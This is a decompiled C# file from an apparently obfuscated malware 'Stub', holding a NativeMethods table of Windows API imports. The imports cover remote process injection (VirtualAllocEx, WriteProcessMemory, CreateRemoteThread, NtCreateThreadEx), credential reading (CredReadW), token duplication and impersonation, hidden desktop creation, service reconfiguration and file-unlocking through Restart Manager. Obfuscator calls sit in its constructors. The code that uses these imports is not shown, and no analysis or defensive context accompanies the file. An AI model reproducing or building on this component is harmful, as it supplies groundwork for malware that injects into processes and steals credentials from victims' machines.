using System;
using System.Runtime.InteropServices;
using System.Text;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000097 RID: 151
	internal sealed class NativeMethods
	{
		// Token: 0x060001CB RID: 459
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool IsWow64Process(IntPtr hProcess, out bool Wow64Process);

		// Token: 0x060001CC RID: 460
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

		// Token: 0x060001CD RID: 461
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool CloseHandle(IntPtr hProcess);

		// Token: 0x060001CE RID: 462
		[DllImport("kernel32.dll")]
		public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

		// Token: 0x060001CF RID: 463
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, ref IntPtr lpTargetHandle, uint dwDesiredAccess, bool bInheritHandle, uint dwOptions);

		// Token: 0x060001D0 RID: 464
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, UIntPtr dwSize, ref UIntPtr lpNumberOfBytesRead);

		// Token: 0x060001D1 RID: 465
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr GetCurrentProcess();

		// Token: 0x060001D2 RID: 466
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint GetCurrentProcessId();

		// Token: 0x060001D3 RID: 467
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint GetThreadId(IntPtr Thread);

		// Token: 0x060001D4 RID: 468
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint SuspendThread(IntPtr Thread);

		// Token: 0x060001D5 RID: 469
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint ResumeThread(IntPtr Thread);

		// Token: 0x060001D6 RID: 470
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint GetCurrentThreadId();

		// Token: 0x060001D7 RID: 471
		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern uint NtGetNextThread(IntPtr ProcessHandle, IntPtr ThreadHandle, uint DesiredAccess, uint HandleAttributes, uint Flags, out IntPtr NewThreadHandle);

		// Token: 0x060001D8 RID: 472
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern void SetLastError(uint dwErrCode);

		// Token: 0x060001D9 RID: 473
		[DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
		public static extern int memcmp(byte[] b1, byte[] b2, UIntPtr count);

		// Token: 0x060001DA RID: 474
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern int NtQueryInformationProcess(IntPtr ProcessHandle, InternalStructs.PROCESSINFOCLASS ProcessInformationClass, ref InternalStructs.PROCESS_BASIC_INFORMATION ProcessInformation, uint BufferSize, ref uint NumberOfBytesRead);

		// Token: 0x060001DB RID: 475 RVA: 0x00014764 File Offset: 0x00012964
		public static int NtQueryPbi32(IntPtr ProcessHandle, InternalStructs.PROCESSINFOCLASS ProcessInformationClass, ref InternalStructs.PROCESS_BASIC_INFORMATION ProcessInformation, uint BufferSize, ref uint NumberOfBytesRead)
		{
			int num = NativeMethods.NtQueryInformationProcess(ProcessHandle, ProcessInformationClass, ref ProcessInformation, BufferSize, ref NumberOfBytesRead);
			if (Environment.Is64BitProcess)
			{
				ProcessInformation.PebBaseAddress += Environment.SystemPageSize;
			}
			return num;
		}

		// Token: 0x060001DC RID: 476
		[DllImport("ntdll.dll", EntryPoint = "NtQueryInformationProcess", SetLastError = true)]
		public static extern int NtQueryInformationProcess_1(IntPtr ProcessHandle, InternalStructs.PROCESSINFOCLASS ProcessInformationClass, ref InternalStructs.PROCESS_BASIC_INFORMATION ProcessInformation, uint BufferSize, ref uint NumberOfBytesRead);

		// Token: 0x060001DD RID: 477
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool IsProcessCritical(IntPtr hProcess, out bool Critical);

		// Token: 0x060001DE RID: 478
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern IntPtr GetSidSubAuthority(IntPtr pSid, uint nSubAuthority);

		// Token: 0x060001DF RID: 479
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);

		// Token: 0x060001E0 RID: 480
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

		// Token: 0x060001E1 RID: 481
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

		// Token: 0x060001E2 RID: 482
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);

		// Token: 0x060001E3 RID: 483
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

		// Token: 0x060001E4 RID: 484
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

		// Token: 0x060001E5 RID: 485
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

		// Token: 0x060001E6 RID: 486
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

		// Token: 0x060001E7 RID: 487
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumberOfBytesWritten);

		// Token: 0x060001E8 RID: 488
		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern IntPtr LoadLibraryW(string LibraryName);

		// Token: 0x060001E9 RID: 489
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool FreeLibrary(IntPtr hLibModule);

		// Token: 0x060001EA RID: 490
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
		public static extern IntPtr GetProcAddress(IntPtr hmodule, string procName);

		// Token: 0x060001EB RID: 491
		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern IntPtr GetModuleHandleW(string lpModuleName);

		// Token: 0x060001EC RID: 492
		[DllImport("kernel32.dll")]
		public static extern InternalStructs.FileType GetFileType(IntPtr hFile);

		// Token: 0x060001ED RID: 493
		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern uint GetFinalPathNameByHandleW(IntPtr hFile, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpszFilePath, uint cchFilePath, uint dwFlags);

		// Token: 0x060001EE RID: 494
		[DllImport("kernel32.dll")]
		public static extern void CopyMemory(IntPtr dest, IntPtr src, UIntPtr count);

		// Token: 0x060001EF RID: 495
		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern uint NtSuspendThread(IntPtr ThreadHandle, IntPtr PreviousSuspendCount);

		// Token: 0x060001F0 RID: 496
		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern uint NtResumeThread(IntPtr ThreadHandle, IntPtr SuspendCount);

		// Token: 0x060001F1 RID: 497
		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern uint NtCreateThreadEx(ref IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);

		// Token: 0x060001F2 RID: 498
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint GetProcessIdOfThread(IntPtr handle);

		// Token: 0x060001F3 RID: 499
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

		// Token: 0x060001F4 RID: 500
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

		// Token: 0x060001F5 RID: 501
		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern bool QueryFullProcessImageNameW(IntPtr hProcess, uint dwFlags, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpExeName, ref uint lpdwSize);

		// Token: 0x060001F6 RID: 502
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
		public static extern IntPtr CreateFileMappingA(IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);

		// Token: 0x060001F7 RID: 503
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool GetFileSizeEx(IntPtr hFile, out ulong FileSize);

		// Token: 0x060001F8 RID: 504
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, UIntPtr dwNumberOfBytesToMap);

		// Token: 0x060001F9 RID: 505
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);

		// Token: 0x060001FA RID: 506
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

		// Token: 0x060001FB RID: 507
		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern uint NtQuerySystemInformation(InternalStructs.SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, out uint ReturnLength);

		// Token: 0x060001FC RID: 508
		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern uint NtWaitForSingleObject(IntPtr Handle, bool Alertable, IntPtr TimeOut);

		// Token: 0x060001FD RID: 509
		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern uint NtQueryInformationThread(IntPtr threadHandle, InternalStructs.THREADINFOCLASS threadInformationClass, IntPtr threadInformation, uint threadInformationLength, out uint returnLength);

		// Token: 0x060001FE RID: 510
		[DllImport("kernel32.dll")]
		public static extern bool AllocConsole();

		// Token: 0x060001FF RID: 511
		[DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern uint RmRegisterResources(uint dwSessionHandle, uint nFiles, string[] rgsFileNames, uint nApplications, InternalStructs.RM_UNIQUE_PROCESS[] rgApplications, uint nServices, string[] rgsServiceNames);

		// Token: 0x06000200 RID: 512
		[DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern uint RmStartSession(out uint pSessionHandle, uint dwSessionFlags, string strSessionKey);

		// Token: 0x06000201 RID: 513
		[DllImport("rstrtmgr.dll", SetLastError = true)]
		public static extern uint RmEndSession(uint pSessionHandle);

		// Token: 0x06000202 RID: 514
		[DllImport("rstrtmgr.dll", SetLastError = true)]
		public static extern uint RmGetList(uint dwSessionHandle, out uint pnProcInfoNeeded, ref uint pnProcInfo, [In] [Out] InternalStructs.RM_PROCESS_INFO[] rgAffectedApps, out InternalStructs.RM_REBOOT_REASON lpdwRebootReasons);

		// Token: 0x06000203 RID: 515
		[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern bool CredReadW(string target, InternalStructs.CRED_TYPE type, int reservedFlag, out IntPtr credentialPtr);

		// Token: 0x06000204 RID: 516
		[DllImport("advapi32.dll")]
		public static extern void CredFree(IntPtr credentialPtr);

		// Token: 0x06000205 RID: 517
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, InternalStructs.SECURITY_IMPERSONATION_LEVEL impersonationLevel, InternalStructs.TOKEN_TYPE tokenType, out IntPtr phNewToken);

		// Token: 0x06000206 RID: 518
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

		// Token: 0x06000207 RID: 519
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool RevertToSelf();

		// Token: 0x06000208 RID: 520
		[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern IntPtr OpenSCManagerW(string lpMachineName, string lpDatabaseName, uint dwDesiredAccess);

		// Token: 0x06000209 RID: 521
		[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern IntPtr OpenServiceW(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

		// Token: 0x0600020A RID: 522
		[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern bool ChangeServiceConfigW(IntPtr hService, uint nServiceType, uint nStartType, uint nErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, IntPtr lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

		// Token: 0x0600020B RID: 523
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool CloseServiceHandle(IntPtr hSCObject);

		// Token: 0x0600020C RID: 524
		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern bool CreateProcessW(string lpApplicationName, StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, IntPtr lpStartupInfo, out InternalStructs.PROCESS_INFORMATION lpProcessInformation);

		// Token: 0x0600020D RID: 525
		[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, StringBuilder lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, IntPtr lpStartupInfo, out InternalStructs.PROCESS_INFORMATION lpProcessInformation);

		// Token: 0x0600020E RID: 526
		[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern IntPtr OpenDesktopW(string lpszDesktop, uint dwFlags, bool fInherit, InternalStructs.DESKTOP_ACCESS dwDesiredAccess);

		// Token: 0x0600020F RID: 527
		[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern IntPtr CreateDesktopW(string lpszDesktop, string lpszDevice, IntPtr pDevmode, uint dwFlags, InternalStructs.DESKTOP_ACCESS dwDesiredAccess, IntPtr lpsa);

		// Token: 0x06000210 RID: 528
		[DllImport("ole32.dll")]
		public static extern int CoInitializeEx(IntPtr pvReserved, uint dwCoInit);

		// Token: 0x06000211 RID: 529
		[DllImport("ole32.dll")]
		public static extern void CoUninitialize();

		// Token: 0x06000212 RID: 530
		[DllImport("ole32.dll")]
		public static extern int CoCreateInstance(ref Guid clsid, IntPtr pUnkOuter, uint dwClsContext, ref Guid iid, out IntPtr ppv);

		// Token: 0x06000213 RID: 531
		[DllImport("ole32.dll")]
		public static extern int CoSetProxyBlanket(IntPtr pProxy, uint dwAuthnSvc, uint dwAuthzSvc, IntPtr pServerPrincName, uint dwAuthnLevel, uint dwImpLevel, IntPtr pAuthInfo, uint dwCapabilities);

		// Token: 0x06000214 RID: 532
		[DllImport("oleaut32.dll")]
		public static extern IntPtr SysStringByteLen(IntPtr bstr);

		// Token: 0x06000215 RID: 533
		[DllImport("oleaut32.dll")]
		public static extern IntPtr SysAllocStringByteLen(byte[] str, uint len);

		// Token: 0x06000216 RID: 534
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool CloseDesktop(IntPtr hDesktop);

		// Token: 0x06000217 RID: 535 RVA: 0x000038B4 File Offset: 0x00001AB4
		public NativeMethods()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x06000218 RID: 536 RVA: 0x000038AD File Offset: 0x00001AAD
		static NativeMethods()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}
	}
}
